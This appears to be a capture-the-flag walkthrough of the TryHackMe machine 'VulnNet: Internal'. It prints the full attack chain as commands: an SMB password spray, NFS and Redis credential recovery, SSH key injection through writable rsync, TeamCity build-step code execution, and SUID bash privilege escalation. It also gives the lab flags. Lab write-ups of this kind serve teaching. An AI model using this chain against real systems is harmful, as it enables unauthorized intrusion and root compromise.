# VulnNet: Internal (TryHackMe) — Full Walkthrough

## Overview

* **Difficulty:** Easy
* **Platform:** TryHackMe
* **Focus Areas:** SMB Enumeration, Credential Reuse, NFS, Redis, Rsync, SSH Key Injection, TeamCity, Privilege Escalation

This writeup walks through my full approach to compromising the **VulnNet: Internal** machine. The box revolves around multiple misconfigurations across different services, including **SMB**, **Rsync**, **Redis**, and **TeamCity**. By exploiting weak security practices and improper configurations, I was able to escalate from unauthenticated access to a full **root** compromise.

---

## Initial Enumeration

To begin the assessment, I performed a **TCP port scan** using RustScan to identify open ports on the target machine. The results were then passed to **Nmap** for detailed service and OS enumeration.

```bash
rustscan -a 10.145.144.160 -r 1-65535 --ulimit 5000 -- -A
```
![Nmap Scan Result](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Nmap%20Scan%20Result.png)

The scan revealed several open ports and services. The most interesting services were:

* **SSH**
* **SMB (Samba)**
* **NFS**
* **Rsync**
* **Redis**

Multiple file-sharing and remote-access services were exposed, indicating possible misconfigurations or credential reuse. I decided to start my enumeration with **SMB**.

---

## SMB Enumeration

To check for **anonymous access** to SMB, I used the following tools:

```bash
smbmap -H 10.145.144.160 -u "" -p ""
smbclient //10.145.144.160/shares -N
```
![Smbmap Result](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Smbmap%20Result.png)
![Smbclient Result](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Smbclient%20Result.png)

Anonymous login was allowed, which is a red flag. Inside the available shares, I found a file named **service.txt**. After downloading it, I retrieved the **service flag**, confirming that SMB was a valid entry point.

![Service Flag](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Service%20Flag.png)

```
Service Flag: THM{0a09d51e488f5fa105d8d866a497440a}
```
---

## User Enumeration and Credential Testing

Next, I ran **enum4linux** to gather additional information about users on the system:

```bash
enum4linux -a 10.145.144.160
```
![Enum4linux User Enumeration](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Enum4linux%20User%20Enumeration.png)
![Password Policy Information](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Password%20Policy%20Information.png)

This revealed a list of usernames and hinted at a **weak password policy**. To test this, I used **crackmapexec** with a common wordlist (rockyou.txt):

```bash
crackmapexec smb 10.145.144.160 -u ubuntu -p rockyou.txt
```
![Crackmapexec Output](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Crackmapexec%20Output.png)

Several usernames were found to be valid with the same password. This suggested poor credential hygiene. I attempted to use these credentials with SMB and SSH:

```bash
smbmap -H 10.145.144.160 -u ubuntu -p 123456
ssh ubuntu@10.145.144.160
```
However, this did not grant further access at this stage.

---

## NFS Enumeration

Since SMB didn’t provide deeper access, I moved on to **NFS** enumeration:

```bash
showmount -e 10.145.144.160
```
![Showmount Output](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Showmount%20Output.png)

This revealed an export that could be mounted. I mounted it locally with:

```bash
mount -t nfs 10.145.144.160://opt/conf /mnt/nfs
```
![NFS Mount Output](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/NFS%20Mount%20Output.png)

Inside the mounted directory, I discovered several configuration files, one of which contained a **Redis configuration file** with a hardcoded password. This was a key finding that allowed me to pivot to Redis.

![NFS Mount Structure](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/NFS%20Mount%20Structure.png)
![Redis Harcoded Password](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Redis%20Hardcoded%20Password.png)

---

## Redis Access and Internal Flag

Using the discovered password, I connected to **Redis**:

```bash
redis-cli -h 10.145.144.160
AUTH B65Hx562F@ggAZ@F
```

After successful authentication, I enumerated the database contents and found the **internal flag**:

![Internal Flag](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Internal%20Flag.png)

```
Internal Flag: THM{ff8e518addbbddb74531a724236a8221}
```

Additionally, I found a **Base64-encoded string** stored in Redis. After decoding it:
![Base64 String](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Base64%20String.png)

```bash
echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
```
![Rsync Credentials](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Rsync%20Credentials.png)

I obtained credentials for the **rsync service**:

```
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

---

## Rsync Access and User Flag
![Rsync Modules](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Rsync%20Modules.png)

With the recovered credentials, I connected to the **rsync** service:

```bash
rsync -av rsync://rsync-connect@10.145.144.160/files
rsync -avz rsync://rsync-connect@10.145.144.160/files/sys-internal .
```
![Rsync Contents](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Rsync%20Contents.png)

I found the **user flag** among the accessible files. Additionally, **rsync** allowed me to upload files, which opened the possibility of gaining a **shell** on the system.
![Sys-Internal Files](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Sys-Internal%20Files.png)
![User Flag](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/User%20Flag.png)

```
User Flag: THM{da7c20696831f253e0afaca8b83c07ab}
```
---

## Gaining SSH Access

To establish a stable foothold, I uploaded my **SSH public key** to the target system using rsync:

```bash
rsync authorized_keys rsync://rsync-connect@10.145.144.160/files/sys-internal/.ssh
```
![SSH Key Upload](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/SSH%20Key%20Upload.png)

After doing this, I successfully logged in as the **sys-internal** user, which gave me a proper shell on the target machine.
![SSH Access](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/SSH%20Access.png)

---

## Privilege Escalation Enumeration

With user-level access, I ran **LinPEAS** for local enumeration:

```bash
./linpeas.sh
```

During the scan, I noticed an unusual directory at:

```
/TeamCity
```
![TeamCity Directory](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/TeamCity%20Directory.png)

This directory is associated with **JetBrains TeamCity**, a continuous integration and deployment service.

---

## Accessing TeamCity

After discovering the **TeamCity** directory, I researched that it typically runs on port **8111**. Since this port wasn’t directly accessible, I used **SSH port forwarding**:

```bash
ssh -L 8111:localhost:8111 sys-internal@10.145.144.160
```

I then accessed **TeamCity's web interface** by navigating to:

```
http://localhost:8111
```
![TeamCity Login](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/TeamCity%20Login.png)

---

## Finding the Admin Token

The TeamCity login page required an **administrator token**. I searched the **TeamCity installation directory** for any tokens:

```bash
grep -r "token" /TeamCity 2>/dev/null
```
![Super User Token](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Super%20User%20Token.png)

This revealed multiple tokens inside log files. One of them successfully authenticated me as an **admin**.

![Super User Panel](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Super%20User%20Panel.png)

---

## Remote Code Execution via TeamCity

With administrative access to TeamCity, I had control over the build system. I exploited this by:

1. Creating a new **project**.
![Create Project](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Create%20Project.png)

2. Configuring a **build pipeline** with a "Command Line" runner type.
![Build Configurations](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Build%20Configurations.png)

3. Adding the following script to set the **SUID** bit on **/bin/bash** to elevate its execution privileges:

```bash
chmod +s /bin/bash
```
![Build Steps](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Build%20Steps.png)
![Build Run](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Build%20Run.png)

After running the configuration, the payload was executed on the target system, and I was able to execute:

```bash
/bin/bash -p
```

This gave me **root** access, and I found the **root flag**:
![Root Flag](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Internal/images/Root%20Flag.png)
```
Root Flag: THM{e8996faea46df09dba5676dd271c60bd}
```

---

## Conclusion

This machine demonstrated how multiple misconfigurations can be chained together to achieve full system compromise:

* **Anonymous SMB access** exposing initial data.
* **Weak password practices** across multiple users.
* **Sensitive configuration files** exposed via NFS.
* **Redis authentication misconfiguration**.
* **Credential reuse enabling rsync access**.
* **Writable rsync access** allowing SSH key injection.
* Exposed **JetBrains TeamCity instance** with recoverable admin token.
* **Remote code execution** through the build pipeline.

By carefully enumerating each service and exploiting exposed credentials, I was able to escalate from unauthenticated access to **root** compromise.

---
